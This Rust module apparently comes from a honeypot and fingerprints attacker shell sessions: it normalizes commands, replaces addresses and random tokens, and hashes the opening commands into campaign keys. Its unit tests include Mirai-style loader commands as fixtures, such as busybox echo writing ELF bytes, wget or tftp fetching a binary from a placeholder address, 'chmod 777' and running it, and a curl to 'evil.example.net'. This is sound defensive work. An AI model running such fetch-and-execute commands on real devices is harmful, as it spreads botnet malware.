//! The command-sequence fingerprint: what makes two shell sessions the same tool.
//!
//! Each command is reduced to a shape: `sensor_framework::command_flood::command_shape` (escape
//! runs, long hex and base64 runs and whitespace runs replaced, the same shape the sensors' flood
//! gate uses), then IPv4 and bracketed IPv6 addresses become `<ip>` and the port after an address
//! or a host name becomes `<port>`, then per-session random tokens (long decimal runs, hex words,
//! the value of a variable assignment that looks like an identifier) become placeholders. A
//! session's run is the ordered list of those shapes with consecutive repeats collapsed, so an
//! echo loader's chunk count, a retried `cat > astats` and the repeats the flood gate suppressed
//! do not split one tool into several campaigns.
//!
//! The campaign key is a running SHA-256 over the first [`KEY_SHAPES`] shapes that are not
//! shell-entry lines, not over the whole run: a bot that disconnects after four commands and one
//! that goes on to sixteen are the same tool and must not be several campaigns. The indexer
//! extends it one command at a time from the 64 bytes and counters it stores per session.

use sha2::{Digest, Sha256};

/// Longest shape kept, in characters: enough to tell commands apart, bounded for storage.
pub const MAX_SHAPE_CHARS: usize = 256;

/// How many opening commands (past the shell-entry lines) make a run's campaign key. Two loaders
/// that share this many opening commands and differ afterwards are one campaign. A run with fewer
/// is keyed by the commands it has, so the number of distinct keys one loader produces when its
/// sessions are cut short is at most this many.
pub const KEY_SHAPES: i32 = 4;

/// Decimal runs of at least this many digits are per-session numbers (a marker, a port, a
/// timestamp); shorter ones are kept: `x86`, `arm7`, `-p 22`, `sleep 30`, `ttyS0`.
const MIN_NUMBER_DIGITS: usize = 4;
/// A word of at least this many hexadecimal characters holding a digit and a letter is a random
/// token. Letters only (`decade`) and digits only (a number) are not.
const MIN_HEX_CHARS: usize = 6;
/// The value of `NAME=value` is an identifier, not a word, from this length with this many digits.
const MIN_ASSIGNED_ID_CHARS: usize = 8;
const MIN_ASSIGNED_ID_DIGITS: usize = 3;

/// The lines Mirai-family telnet loaders send to reach a shell before doing anything. They belong
/// to the target's login flow, not to the tool, so they are not part of a run's key and are
/// skipped when its label is chosen.
const SHELL_ENTRY_PREAMBLE: &[&str] = &[
    "start",
    "enable",
    "config terminal",
    "system",
    "linuxshell",
    "su",
    "shell",
    "sh",
];

/// The shape of one command line.
pub fn normalize(command: &str) -> String {
    let shape = sensor_framework::command_flood::command_shape(command.trim());
    replace_tokens(&replace_addresses(&shape))
        .chars()
        .take(MAX_SHAPE_CHARS)
        .collect()
}

/// Replace the per-session random tokens in a shape that already has its addresses and ports
/// replaced. A token is read as a whole alphanumeric word, so `P155084A` and `tmp155084` keep
/// their letters and lose their number, and `49482a1671` is one hex token.
fn replace_tokens(shape: &str) -> String {
    let chars: Vec<char> = shape.chars().collect();
    let mut out = String::with_capacity(shape.len());
    let mut i = 0;
    while let Some(&c) = chars.get(i) {
        if !c.is_ascii_alphanumeric() {
            out.push(c);
            i += 1;
            continue;
        }
        let start = i;
        while chars.get(i).is_some_and(char::is_ascii_alphanumeric) {
            i += 1;
        }
        let word: String = chars[start..i].iter().collect();
        let assigned = start > 0 && chars.get(start - 1) == Some(&'=');
        replace_word(&word, assigned, &mut out);
    }
    out
}

fn replace_word(word: &str, assigned: bool, out: &mut String) {
    let digits = word.bytes().filter(u8::is_ascii_digit).count();
    let letters = word.len() - digits;
    if word.len() >= MIN_HEX_CHARS
        && digits > 0
        && letters > 0
        && word.bytes().all(|b| b.is_ascii_hexdigit())
    {
        out.push_str("<hex>");
    } else if assigned
        && word.len() >= MIN_ASSIGNED_ID_CHARS
        && digits >= MIN_ASSIGNED_ID_DIGITS
        && letters > 0
    {
        out.push_str("<tok>");
    } else if letters == 0 && is_octal_mode(word) && follows_chmod(out) {
        // `chmod 0755` and `chmod 0777` are different commands, not two random numbers.
        out.push_str(word);
    } else {
        replace_numbers(word, out);
    }
}

fn is_octal_mode(word: &str) -> bool {
    word.len() == MIN_NUMBER_DIGITS && word.bytes().all(|b| (b'0'..=b'7').contains(&b))
}

/// Whether the last words written are `chmod` or `chmod -OPTION`.
fn follows_chmod(out: &str) -> bool {
    let mut words = out.split_whitespace().rev();
    match words.next() {
        Some("chmod") => true,
        Some(w) if w.starts_with('-') => words.next() == Some("chmod"),
        _ => false,
    }
}

/// Every decimal run of at least [`MIN_NUMBER_DIGITS`] digits in `word` becomes `<num>`.
fn replace_numbers(word: &str, out: &mut String) {
    let bytes = word.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let run = bytes[i..].iter().take_while(|b| b.is_ascii_digit()).count();
        if run >= MIN_NUMBER_DIGITS {
            out.push_str("<num>");
            i += run;
        } else if run > 0 {
            out.push_str(&word[i..i + run]);
            i += run;
        } else {
            let ch = word[i..].chars().next().unwrap_or_default();
            out.push(ch);
            i += ch.len_utf8().max(1);
        }
    }
}

/// Whether a shape is one of the shell-entry lines a loader sends to reach a shell.
pub fn is_entry(shape: &str) -> bool {
    SHELL_ENTRY_PREAMBLE.contains(&shape.to_ascii_lowercase().as_str())
}

const HTTP_METHODS: &[&str] = &[
    "GET", "POST", "PUT", "HEAD", "DELETE", "OPTIONS", "CONNECT", "PATCH", "TRACE",
];

/// Whether a shape is a line of an HTTP request: a request line (`GET /x HTTP/1.1`) or a header
/// (`User-Agent: ...`). Such lines on a shell port are a client that spoke the wrong protocol; the
/// order and choice of headers say nothing about which tool it was.
pub fn is_http_request(shape: &str) -> bool {
    let request_line = shape.split_once(' ').is_some_and(|(method, rest)| {
        HTTP_METHODS.contains(&method)
            && rest
                .rsplit_once(" HTTP/")
                .is_some_and(|(_, v)| v.starts_with(|c: char| c.is_ascii_digit()))
    });
    let header = shape.split_once(": ").is_some_and(|(name, _)| {
        (2..=40).contains(&name.len())
            && name.starts_with(|c: char| c.is_ascii_uppercase())
            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
    });
    request_line || header
}

fn ipv4_len(s: &[u8]) -> Option<usize> {
    let mut at = 0;
    for part in 0..4 {
        let digits = s
            .get(at..)?
            .iter()
            .take(4)
            .take_while(|b| b.is_ascii_digit())
            .count();
        if !(1..=3).contains(&digits) {
            return None;
        }
        let value: u16 = std::str::from_utf8(s.get(at..at + digits)?)
            .ok()?
            .parse()
            .ok()?;
        if value > 255 {
            return None;
        }
        at += digits;
        if part < 3 {
            if s.get(at) != Some(&b'.') {
                return None;
            }
            at += 1;
        }
    }
    // `1.2.3.4.5` or `1.2.3.45678` is a version string or something else, not an address.
    match s.get(at) {
        Some(b) if b.is_ascii_digit() => None,
        Some(b'.') if s.get(at + 1).is_some_and(u8::is_ascii_digit) => None,
        _ => Some(at),
    }
}

fn bracketed_ipv6_len(s: &[u8]) -> Option<usize> {
    if s.first() != Some(&b'[') {
        return None;
    }
    let close = s.iter().take(48).position(|&b| b == b']')?;
    let inner = s.get(1..close)?;
    let colons = inner.iter().filter(|&&b| b == b':').count();
    (colons >= 2
        && inner
            .iter()
            .all(|b| b.is_ascii_hexdigit() || *b == b':' || *b == b'.'))
    .then_some(close + 1)
}

/// The length of a `:PORT` or ` PORT` (one to five digits, not followed by another digit or a
/// word character) at the start of `s`.
fn port_len(s: &[u8], sep: u8) -> Option<usize> {
    if s.first() != Some(&sep) {
        return None;
    }
    let digits = s
        .get(1..)?
        .iter()
        .take(6)
        .take_while(|b| b.is_ascii_digit())
        .count();
    let next = s.get(1 + digits);
    ((1..=5).contains(&digits) && !next.is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'.'))
        .then_some(1 + digits)
}

fn replace_addresses(shape: &str) -> String {
    let bytes = shape.as_bytes();
    let mut out = String::with_capacity(shape.len());
    let mut i = 0;
    let mut prev_word = false;
    while i < bytes.len() {
        let rest = &bytes[i..];
        let address = if prev_word {
            None
        } else {
            ipv4_len(rest).or_else(|| bracketed_ipv6_len(rest))
        };
        if let Some(len) = address {
            out.push_str("<ip>");
            i += len;
            if let Some(p) = port_len(&bytes[i..], b':').or_else(|| port_len(&bytes[i..], b' ')) {
                out.push_str(if bytes[i] == b':' {
                    ":<port>"
                } else {
                    " <port>"
                });
                i += p;
            }
            prev_word = true;
            continue;
        }
        // A host name's port: `example.net:8080/x`.
        if bytes[i] == b':'
            && prev_word
            && out.ends_with(|c: char| c.is_ascii_alphanumeric())
            && let Some(p) = port_len(rest, b':')
        {
            out.push_str(":<port>");
            i += p;
            continue;
        }
        let ch = shape[i..].chars().next().unwrap_or_default();
        out.push(ch);
        prev_word = ch.is_ascii_alphanumeric() || matches!(ch, '.' | '_' | '-');
        i += ch.len_utf8().max(1);
    }
    out
}

const CHAIN_SEED: &[u8] = b"propolis campaign fingerprint v2";
const HTTP_KEY_SEED: &[u8] = b"propolis campaign fingerprint v2 http request";
const ENTRY_ONLY_KEY_SEED: &[u8] = b"propolis campaign fingerprint v2 shell entry only";

/// A run's fingerprint state: the digest over its opening commands, the digest of its last shape
/// (to collapse a repeat), how many shapes it holds and their total length, and how many of the
/// shapes folded into the digest.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RunDigest {
    pub chain: [u8; 32],
    pub last_shape: [u8; 32],
    /// Collapsed shapes in the run, shell-entry lines included.
    pub shapes: i32,
    pub shape_chars: i32,
    /// Shapes folded into `chain`: at most [`KEY_SHAPES`], none of them a shell-entry line.
    pub payload: i32,
}

impl Default for RunDigest {
    fn default() -> Self {
        Self {
            chain: Sha256::digest(CHAIN_SEED).into(),
            last_shape: [0; 32],
            shapes: 0,
            shape_chars: 0,
            payload: 0,
        }
    }
}

impl RunDigest {
    /// Fold one shape into the run. A shape equal to the one before it changes nothing and returns
    /// false.
    pub fn fold(&mut self, shape: &str) -> bool {
        self.fold_keyed(shape, KEY_SHAPES)
    }

    /// [`Self::fold`] with the key length given, so a test can compare lengths.
    fn fold_keyed(&mut self, shape: &str, key_shapes: i32) -> bool {
        let digest: [u8; 32] = Sha256::digest(shape.as_bytes()).into();
        if self.shapes > 0 && digest == self.last_shape {
            return false;
        }
        self.last_shape = digest;
        self.shapes += 1;
        self.shape_chars = self
            .shape_chars
            .saturating_add(i32::try_from(shape.chars().count()).unwrap_or(i32::MAX));
        if is_entry(shape) || self.payload >= key_shapes {
            return true;
        }
        if self.payload == 0 && is_http_request(shape) {
            // One key for the whole class: which headers a client sent, and in what order,
            // is not which tool it was.
            self.chain = Sha256::digest(HTTP_KEY_SEED).into();
            self.payload = key_shapes;
            return true;
        }
        let mut chain = Sha256::new();
        chain.update(self.chain);
        chain.update((shape.len() as u32).to_be_bytes());
        chain.update(shape.as_bytes());
        self.chain = chain.finalize().into();
        self.payload += 1;
        true
    }

    /// The campaign key in lowercase hex: the digest over the opening commands, or one fixed key
    /// for a run that never got past the shell-entry lines.
    pub fn key(&self) -> String {
        let key: [u8; 32] = if self.payload == 0 {
            Sha256::digest(ENTRY_ONLY_KEY_SEED).into()
        } else {
            self.chain
        };
        key.iter().map(|b| format!("{b:02x}")).collect()
    }
}

/// The collapsed shapes of a run, given its commands in order, at most `max`.
pub fn collapsed_shapes<'a>(
    commands: impl IntoIterator<Item = &'a str>,
    max: usize,
) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for command in commands {
        if out.len() >= max {
            break;
        }
        let shape = normalize(command);
        if !shape.is_empty() && out.last() != Some(&shape) {
            out.push(shape);
        }
    }
    out
}

/// What a campaign's label says it did: the first three shapes past the shell-entry lines, or a
/// fixed phrase for the two classes keyed as one (a run of HTTP lines, a run of shell-entry lines
/// only).
pub fn opening(shapes: &[String]) -> String {
    let mut payload = shapes.iter().map(String::as_str).filter(|s| !is_entry(s));
    match payload.next() {
        None => "shell entry only".to_string(),
        Some(first) if is_http_request(first) => "http request sent to a shell port".to_string(),
        Some(first) => {
            let joined = std::iter::once(first)
                .chain(payload.take(2))
                .collect::<Vec<_>>()
                .join(" ; ");
            joined.chars().take(120).collect()
        }
    }
}

/// A campaign's label: how many commands its runs held, as a range when they differ, and the
/// opening.
pub fn label(opening: &str, fewest: i32, most: i32) -> String {
    let count = if fewest == most {
        format!(
            "{fewest} {}",
            if fewest == 1 { "command" } else { "commands" }
        )
    } else {
        format!("{fewest}-{most} commands")
    };
    format!("{count}: {opening}")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run_key(commands: &[&str]) -> String {
        let mut run = RunDigest::default();
        for c in commands {
            run.fold(&normalize(c));
        }
        run.key()
    }

    #[test]
    fn addresses_and_ports_become_placeholders() {
        assert_eq!(
            normalize("wget http://192.0.2.10:8080/i -O /tmp/i"),
            "wget http://<ip>:<port>/i -O /tmp/i"
        );
        assert_eq!(normalize("nc 198.51.100.4 4444"), "nc <ip> <port>");
        assert_eq!(
            normalize("curl http://evil.example.net:81/x"),
            "curl http://evil.example.net:<port>/x"
        );
        assert_eq!(
            normalize("ping -c1 [2001:db8::7]:22"),
            "ping -c1 <ip>:<port>"
        );
        // A version string, a longer dotted number and a word ending in digits are not addresses.
        assert_eq!(
            normalize("apt install foo=1.2.3.4.5"),
            "apt install foo=1.2.3.4.5"
        );
        assert_eq!(normalize("echo v1.2.3.4"), "echo v1.2.3.4");
        assert_eq!(normalize("sleep 30"), "sleep 30");
    }

    #[test]
    fn sessions_differing_only_in_markers_and_addresses_share_a_fingerprint() {
        let a = [
            "enable",
            "sh",
            "/bin/busybox echo -ne '\\x41\\x42\\x43' > .x",
            "/bin/busybox echo -ne '\\x7f\\x45\\x4c\\x46' >> .i",
            "/bin/busybox echo -ne '\\x01\\x02' >> .i",
            "wget http://192.0.2.1/i; chmod 777 i; ./i 192.0.2.1:23",
        ];
        let b = [
            "enable",
            "sh",
            "/bin/busybox echo -ne '\\x5a\\x5b' > .x",
            "/bin/busybox echo -ne '\\x10\\x11' >> .i",
            "wget http://203.0.113.200/i; chmod 777 i; ./i 203.0.113.200:2323",
        ];
        assert_eq!(run_key(&a), run_key(&b));
        let c = [
            "enable",
            "sh",
            "/bin/busybox echo -ne '\\x5a' > .x",
            "tftp -g -r i 203.0.113.200",
        ];
        assert_ne!(run_key(&a), run_key(&c));
        // Order matters: the same commands in another order are another tool.
        let mut reordered = a;
        reordered.swap(2, 3);
        assert_ne!(run_key(&a), run_key(&reordered));
        // The shell-entry lines are the target's login flow, not the tool: a different way into
        // the shell, or none, is the same tool.
        let mut other_entry = a.to_vec();
        other_entry.splice(0..2, ["system", "shell", "sh"]);
        assert_eq!(run_key(&a), run_key(&other_entry));
        assert_eq!(run_key(&a), run_key(&a[2..]));
    }

    #[test]
    fn a_repeated_command_collapses_but_a_return_to_it_does_not() {
        let mut run = RunDigest::default();
        assert!(run.fold("cat > astats"));
        assert!(!run.fold("cat > astats"));
        assert!(!run.fold("cat > astats"));
        assert_eq!(run.shapes, 1);
        assert!(run.fold("ps aux"));
        assert!(run.fold("cat > astats"));
        assert_eq!(run.shapes, 3);
        assert_eq!(run.shape_chars, 12 + 6 + 12);
    }

    #[test]
    fn collapsed_shapes_agree_with_the_running_digest() {
        let commands = ["uname -a", "uname -a", "nproc", "cat > w.sh", "nproc"];
        let shapes = collapsed_shapes(commands, 64);
        assert_eq!(shapes, vec!["uname -a", "nproc", "cat > w.sh", "nproc"]);
        let mut run = RunDigest::default();
        for s in &shapes {
            run.fold(s);
        }
        assert_eq!(run.key(), run_key(&commands));
    }

    #[test]
    fn the_label_skips_the_shell_entry_preamble() {
        let shapes: Vec<String> = [
            "enable",
            "system",
            "shell",
            "sh",
            "uname -a",
            "nproc",
            "cat > w.sh",
            "id",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        let open = opening(&shapes);
        assert_eq!(open, "uname -a ; nproc ; cat > w.sh");
        assert_eq!(
            label(&open, 8, 8),
            "8 commands: uname -a ; nproc ; cat > w.sh"
        );
        assert_eq!(
            label(&open, 3, 16),
            "3-16 commands: uname -a ; nproc ; cat > w.sh"
        );
        assert_eq!(
            label(&open, 1, 1),
            "1 command: uname -a ; nproc ; cat > w.sh"
        );
    }

    #[test]
    fn random_tokens_become_placeholders_and_short_numbers_stay() {
        // The owner's 2026-10-08 marker family: only the number differs per session.
        assert_eq!(normalize("echo P155084A"), "echo P<num>A");
        assert_eq!(normalize("echo P155084A"), normalize("echo P98731A"));
        assert_eq!(
            normalize("echo $(( 155084 + 1 ))"),
            normalize("echo $(( 4471002 + 1 ))")
        );
        assert_eq!(normalize("echo $(( 155084 + 1 ))"), "echo $(( <num> + 1 ))");
        // A variable assigned a hex token, and one assigned an identifier that is not hex.
        assert_eq!(
            normalize("N=49482a1671; cd /data/local/tmp"),
            "N=<hex>; cd /data/local/tmp"
        );
        assert_eq!(normalize("N=k3j9x2m1q8"), "N=<tok>");
        assert_eq!(normalize("tmp=/tmp/a1b2c3d4"), "tmp=/tmp/<hex>");
        // Short numbers are tool vocabulary: architectures, small ports, delays, devices.
        for kept in [
            "wget http://<ip>/bins/x86_64",
            "./bins.sh arm7",
            "./bins.sh arm5",
            "sleep 30",
            "nc -l -p 22",
            "echo > /dev/ttyS0",
            "ARCH=mips64el",
            "ARCH=armv7l",
            "echo v1.2.3.4",
            "head -c 100 f",
        ] {
            assert_eq!(normalize(kept), kept);
        }
        assert_ne!(normalize("./bins.sh arm5"), normalize("./bins.sh arm7"));
        // A word without a digit is a word, whatever its letters; a run of digits is a number.
        assert_eq!(normalize("echo decade"), "echo decade");
        assert_eq!(normalize("sha256sum f"), "sha256sum f");
        assert_eq!(normalize("echo abc123"), "echo <hex>");
        assert_eq!(normalize("sleep 1000"), "sleep <num>");
        assert_eq!(normalize("ssh -p 2222 h"), "ssh -p <num> h");
        // File modes are commands, not random numbers.
        assert_eq!(normalize("chmod 0755 f"), "chmod 0755 f");
        assert_eq!(normalize("chmod -R 0777 f"), "chmod -R 0777 f");
        assert_ne!(normalize("chmod 0755 f"), normalize("chmod 0777 f"));
        assert_eq!(normalize("echo 0755 f"), "echo <num> f");
    }

    #[test]
    fn http_lines_and_shell_entry_lines_are_recognized() {
        for line in [
            "User-Agent: Go-http-client/1.1",
            "Accept: application/json",
            "Node-Red-Api-Version: v2",
            "Host: <ip>:<port>",
            "GET / HTTP/1.1",
            "POST /api/login HTTP/1.0",
        ] {
            assert!(is_http_request(line), "{line}");
        }
        for line in [
            "echo: not a header",
            "cat /etc/passwd",
            "GET the file",
            "wget http://198.51.100.9/x",
            "export PATH: x",
            "uname -a",
        ] {
            assert!(!is_http_request(line), "{line}");
        }
        assert!(is_entry("Enable") && is_entry("config terminal") && is_entry("sh"));
        assert!(!is_entry("sh run.sh") && !is_entry("echo sh"));
    }

    #[test]
    fn header_probes_in_any_order_are_one_key_and_not_a_shell_tools_key() {
        let a = run_key(&[
            "User-Agent: Go-http-client/1.1",
            "Accept: application/json",
            "Node-Red-Api-Version: v2",
        ]);
        let b = run_key(&[
            "Accept: application/json",
            "Node-Red-Api-Version: v2",
            "User-Agent: Go-http-client/1.1",
            "Accept-Encoding: gzip",
        ]);
        let c = run_key(&["GET /api HTTP/1.1", "Host: 192.0.2.5"]);
        assert_eq!(a, b);
        assert_eq!(a, c);
        assert_ne!(a, run_key(&["uname -a", "id", "ls /", "pwd"]));
        let shapes: Vec<String> = ["User-Agent: x", "Accept: y"].map(String::from).to_vec();
        assert_eq!(opening(&shapes), "http request sent to a shell port");
    }

    #[test]
    fn a_run_of_shell_entry_lines_only_is_one_key() {
        let a = run_key(&["start", "enable", "config terminal"]);
        let b = run_key(&[
            "start",
            "enable",
            "config terminal",
            "system",
            "shell",
            "sh",
        ]);
        let c = run_key(&["linuxshell", "system", "shell"]);
        assert_eq!(a, b);
        assert_eq!(a, c);
        assert_ne!(a, run_key(&["enable", "system", "id"]));
        let shapes: Vec<String> = ["start", "enable"].map(String::from).to_vec();
        assert_eq!(opening(&shapes), "shell entry only");
    }

    /// One loader's session cut after `n` commands, `n` = 1..=cmds.len().
    fn cut_keys(cmds: &[&str], key_shapes: i32) -> std::collections::BTreeSet<String> {
        (1..=cmds.len())
            .map(|n| {
                let mut run = RunDigest::default();
                for c in &cmds[..n] {
                    run.fold_keyed(&normalize(c), key_shapes);
                }
                run.key()
            })
            .collect()
    }

    /// Synthetic loaders modelled on the shapes seen live on 2026-10-08. `shared` is how many
    /// opening commands the two Mirai-like loaders have in common.
    fn mirai_like(shared: usize, tail: &str) -> Vec<String> {
        let common = [
            ">/var/run/.x&&cd /var/run;>/tmp/.x&&cd /tmp;>/dev/.x&&cd /dev",
            "/bin/busybox ZXCVB",
            "/bin/busybox cat /proc/mounts",
            "/bin/busybox ls /dev",
        ];
        let mut out: Vec<String> = common[..shared].iter().map(|s| s.to_string()).collect();
        out.extend([
            format!("/bin/busybox {tail} 192.0.2.7 -O .x"),
            "/bin/busybox echo -ne '\\x7f\\x45\\x4c\\x46' > .x".into(),
            "/bin/busybox echo -ne '\\x01\\x01\\x01' >> .x".into(),
            "/bin/busybox chmod 777 .x".into(),
            "./.x telnet.loader".into(),
            "rm -f .x".into(),
            "/bin/busybox ps".into(),
            "/bin/busybox kill -9 1".into(),
            "/bin/busybox uname -m".into(),
            "/bin/busybox id".into(),
            "/bin/busybox df".into(),
            "/bin/busybox free".into(),
        ]);
        out
    }

    /// Evidence for [`KEY_SHAPES`]: the keys one loader produces when its sessions stop after 1
    /// to 16 commands, against whether two different loaders stay apart, for each key length.
    #[test]
    fn key_length_trades_fragments_of_one_loader_against_merging_two() {
        let one: Vec<String> = mirai_like(4, "wget http://");
        let one_ref: Vec<&str> = one.iter().map(String::as_str).collect();
        // The same four opening commands, then another downloader: differs only at command 5.
        let other: Vec<String> = mirai_like(4, "tftp -g -l .x -r x86");
        let other_ref: Vec<&str> = other.iter().map(String::as_str).collect();
        // Three shared opening commands, then another downloader: differs at command 4.
        let third: Vec<String> = mirai_like(3, "wget http://");
        let third_ref: Vec<&str> = third.iter().map(String::as_str).collect();
        let full = |cmds: &[&str], k: i32| {
            let mut run = RunDigest::default();
            for c in cmds {
                run.fold_keyed(&normalize(c), k);
            }
            run.key()
        };
        // (key length, distinct keys from one loader cut at 1..=16 commands, whether the two
        // loaders sharing 3 stay apart, whether the two sharing 4 stay apart)
        let table: Vec<(i32, usize, bool, bool)> = (1..=8)
            .map(|k| {
                (
                    k,
                    cut_keys(&one_ref, k).len(),
                    full(&one_ref, k) != full(&third_ref, k),
                    full(&one_ref, k) != full(&other_ref, k),
                )
            })
            .collect();
        assert_eq!(
            table,
            vec![
                (1, 1, false, false),
                (2, 2, false, false),
                (3, 3, false, false),
                (4, 4, true, false),
                (5, 5, true, true),
                (6, 6, true, true),
                (7, 7, true, true),
                (8, 8, true, true),
            ],
            "key length, keys per loader, loaders sharing 3 apart, loaders sharing 4 apart"
        );
        let chosen = table.iter().find(|row| row.0 == KEY_SHAPES).unwrap();
        assert!(
            chosen.2,
            "the chosen length keeps apart loaders that share their first three commands"
        );
        // The loader cut at 1..=16 commands is KEY_SHAPES keys, not sixteen.
        assert_eq!(cut_keys(&one_ref, KEY_SHAPES).len(), KEY_SHAPES as usize);
    }
}
